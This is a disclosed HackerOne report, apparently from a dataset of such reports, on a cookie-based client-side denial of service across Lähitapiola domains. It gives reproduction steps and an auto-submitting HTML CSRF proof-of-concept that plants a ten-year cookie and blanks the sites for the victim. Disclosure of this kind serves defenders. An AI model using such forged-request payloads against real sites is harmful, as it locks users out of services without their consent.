---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '129001'
original_report_id: '129001'
title: Cookie-based client-side denial-of-service to all of the Lähitapiola domains
weakness: Cross-Site Request Forgery (CSRF)
team_handle: localtapiola
created_at: '2016-04-07T13:21:42.998Z'
disclosed_at: '2016-08-30T19:13:39.074Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Cookie-based client-side denial-of-service to all of the Lähitapiola domains

## Metadata

- HackerOne Report ID: 129001
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: localtapiola
- Disclosed At: 2016-08-30T19:13:39.074Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

# Cookie-based client-side denial-of-service to all of the Lähitapiola domains

Time of detection: 23.2.2016 03:00-04:00

Affected URL: https://www.lahitapiola.fi/cs/Satellite?pagename=LahiTapiola/LTStatus&cookieName=selectedArea&cookieValue=1&backurl=http://www.lahitapiola.fi

## Description:
After the victim opens the affected URL (by direct URL or via CSRF), the victim cannot access any of the Tapiola-domains (see the list below).
The vulnerability affects anonymous AND authenticated users.
This full client-side denial-of-service will last until the "selectedArea"-cookie expires which is about 10 years from the last login. Customer can recover from the condition by deleting the "selectedArea"-cookie.

## List of domains which cannot be used by the client:
- www.tapiola.fi
- www.lahitapiola.fi
- verkkopalvelu.tapiola.fi
- yrityspalvelu.tapiola.fi

## Steps to reproduce:
1. Navigate either directly or via CSRF-attack to following URL:
 - https://www.lahitapiola.fi/cs/Satellite?pagename=LahiTapiola/LTStatus&cookieName=selectedArea&cookieValue=1&backurl=http://www.lahitapiola.fi
2. Try to open www.tapiola.fi and notice that a white screen is returned.
3. Try to open www.lahitapiola.fi and notice that a white screen is returned.
4. Try to open verkkopalvelu.tapiola.fi and notice that a white screen is returned.
5. Try to open yrityspalvelu.tapiola.fi and notice that a white screen is returned.
6. Delete browser cookies and notice that you can now browse the Lähitapiola-website normally.

## CSRF proof-of-concept:

<html>
  <body>
    <form action="https://www.lahitapiola.fi/cs/Satellite">
      <input type="hidden" name="pagename" value="LahiTapiola&#47;LTStatus" />
      <input type="hidden" name="cookieName" value="selectedArea" />
      <input type="hidden" name="cookieValue" value="1" />
      <input type="hidden" name="backurl" value="http&#58;&#47;&#47;www&#46;lahitapiola&#46;fi" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
